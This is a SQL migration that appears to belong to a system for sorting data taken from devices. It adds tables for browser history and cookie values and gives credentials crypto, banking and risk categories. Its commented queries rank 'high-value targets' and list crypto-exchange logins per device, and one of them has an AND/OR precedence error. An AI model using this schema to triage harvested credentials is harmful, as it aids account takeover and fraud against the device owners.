-- Migration: Add Category Detection to Credentials and Browser History
-- Description: Integrates logSniper-inspired category system into credentials and browser history
-- Purpose: Enable category-based filtering and risk scoring for all parsed data types

-- ============================================================================
-- PART 1: Create browser_history table (missing from previous migrations!)
-- ============================================================================

CREATE TABLE IF NOT EXISTS browser_history (
  id BIGINT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(255) NOT NULL,
  url TEXT NOT NULL,
  title TEXT NULL,
  visit_count INT DEFAULT 1,
  last_visit_time BIGINT NOT NULL COMMENT 'Chrome WebKit timestamp',
  browser VARCHAR(100) NULL,
  profile VARCHAR(100) NULL,
  file_path TEXT NULL,

  -- Category detection fields
  categories JSON NULL COMMENT 'Array of detected categories (crypto, banking, cloud, etc.)',
  primary_category VARCHAR(50) NULL COMMENT 'Primary/highest-risk category',
  risk_level ENUM('critical', 'high', 'medium', 'low', 'unknown') DEFAULT 'unknown' COMMENT 'Risk level based on category',
  risk_score INT DEFAULT 0 COMMENT 'Risk score 0-100',

  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,

  INDEX idx_device_id (device_id),
  INDEX idx_browser (browser),
  INDEX idx_visit_count (visit_count),
  INDEX idx_last_visit_time (last_visit_time),
  INDEX idx_primary_category (primary_category),
  INDEX idx_risk_level (risk_level),
  INDEX idx_risk_score (risk_score),

  -- Composite indexes for category-based queries
  INDEX idx_device_category (device_id, primary_category),
  INDEX idx_device_risk (device_id, risk_level)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='Browser history with category detection and risk scoring';

-- ============================================================================
-- PART 2: Create cookies table (missing from previous migrations!)
-- ============================================================================

CREATE TABLE IF NOT EXISTS cookies (
  id BIGINT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(255) NOT NULL,
  host_key VARCHAR(255) NOT NULL COMMENT 'Cookie domain',
  name VARCHAR(255) NOT NULL,
  value TEXT NULL,
  path VARCHAR(255) DEFAULT '/',
  expires_utc BIGINT DEFAULT 0,
  is_secure BOOLEAN DEFAULT FALSE,
  is_httponly BOOLEAN DEFAULT FALSE,
  same_site VARCHAR(20) NULL COMMENT 'no_restriction, lax, strict',
  browser VARCHAR(100) NULL,
  profile VARCHAR(100) NULL,
  file_path TEXT NULL,

  -- Category detection fields
  categories JSON NULL COMMENT 'Array of detected categories (crypto, banking, cloud, etc.)',
  primary_category VARCHAR(50) NULL COMMENT 'Primary/highest-risk category',
  risk_level ENUM('critical', 'high', 'medium', 'low', 'unknown') DEFAULT 'unknown' COMMENT 'Risk level based on category',
  risk_score INT DEFAULT 0 COMMENT 'Risk score 0-100',

  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,

  INDEX idx_device_id (device_id),
  INDEX idx_host_key (host_key),
  INDEX idx_browser (browser),
  INDEX idx_primary_category (primary_category),
  INDEX idx_risk_level (risk_level),
  INDEX idx_risk_score (risk_score),

  -- Composite indexes for category-based queries
  INDEX idx_device_category (device_id, primary_category),
  INDEX idx_device_risk (device_id, risk_level)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='Cookies with category detection and risk scoring';

-- ============================================================================
-- PART 3: Add category fields to credentials table
-- ============================================================================

ALTER TABLE credentials
  ADD COLUMN IF NOT EXISTS categories JSON NULL COMMENT 'Array of detected categories (crypto, banking, cloud, etc.)',
  ADD COLUMN IF NOT EXISTS primary_category VARCHAR(50) NULL COMMENT 'Primary/highest-risk category',
  ADD COLUMN IF NOT EXISTS risk_level ENUM('critical', 'high', 'medium', 'low', 'unknown') DEFAULT 'unknown' COMMENT 'Risk level based on category',
  ADD COLUMN IF NOT EXISTS risk_score INT DEFAULT 0 COMMENT 'Risk score 0-100';

-- Add indexes for category-based queries
CREATE INDEX IF NOT EXISTS idx_primary_category ON credentials(primary_category);
CREATE INDEX IF NOT EXISTS idx_risk_level ON credentials(risk_level);
CREATE INDEX IF NOT EXISTS idx_risk_score ON credentials(risk_score);

-- Composite indexes for efficient filtering
CREATE INDEX IF NOT EXISTS idx_device_category ON credentials(device_id, primary_category);
CREATE INDEX IF NOT EXISTS idx_device_risk ON credentials(device_id, risk_level);
CREATE INDEX IF NOT EXISTS idx_risk_category ON credentials(risk_level, primary_category);

-- Update table comment
ALTER TABLE credentials COMMENT = 'Credentials with category detection, risk scoring, and email parsing';

-- ============================================================================
-- PART 4: Update devices table to track category statistics
-- ============================================================================

ALTER TABLE devices
  ADD COLUMN IF NOT EXISTS total_history INT DEFAULT 0 COMMENT 'Number of browser history entries',
  ADD COLUMN IF NOT EXISTS total_downloads INT DEFAULT 0 COMMENT 'Number of downloads',
  ADD COLUMN IF NOT EXISTS total_bookmarks INT DEFAULT 0 COMMENT 'Number of bookmarks',
  ADD COLUMN IF NOT EXISTS critical_risk_count INT DEFAULT 0 COMMENT 'Number of critical risk credentials',
  ADD COLUMN IF NOT EXISTS high_risk_count INT DEFAULT 0 COMMENT 'Number of high risk credentials';

-- ============================================================================
-- Example queries after migration
-- ============================================================================

-- Find all CRITICAL risk credentials (crypto exchanges, banks, password managers):
-- SELECT * FROM credentials
-- WHERE risk_level = 'critical'
-- ORDER BY risk_score DESC;

-- Get high-value targets by category:
-- SELECT primary_category, COUNT(*) as count,
--        AVG(risk_score) as avg_risk
-- FROM credentials
-- WHERE risk_level IN ('critical', 'high')
-- GROUP BY primary_category
-- ORDER BY avg_risk DESC;

-- Find cryptocurrency exchange credentials:
-- SELECT device_id, url, username, risk_score
-- FROM credentials
-- WHERE primary_category = 'crypto'
-- AND url LIKE '%binance%' OR url LIKE '%coinbase%'
-- ORDER BY risk_score DESC;

-- Get risk distribution for a device:
-- SELECT risk_level, COUNT(*) as count
-- FROM credentials
-- WHERE device_id = 'some-device-id'
-- GROUP BY risk_level
-- ORDER BY
--   CASE risk_level
--     WHEN 'critical' THEN 1
--     WHEN 'high' THEN 2
--     WHEN 'medium' THEN 3
--     WHEN 'low' THEN 4
--     ELSE 5
--   END;

-- Find users who visited crypto sites frequently:
-- SELECT device_id, url, title, visit_count, risk_score
-- FROM browser_history
-- WHERE primary_category = 'crypto'
-- AND visit_count > 10
-- ORDER BY visit_count DESC;

-- Get category breakdown for browser history:
-- SELECT primary_category,
--        COUNT(*) as total_visits,
--        SUM(visit_count) as total_visit_count,
--        AVG(risk_score) as avg_risk
-- FROM browser_history
-- WHERE device_id = 'some-device-id'
-- GROUP BY primary_category
-- ORDER BY total_visit_count DESC;
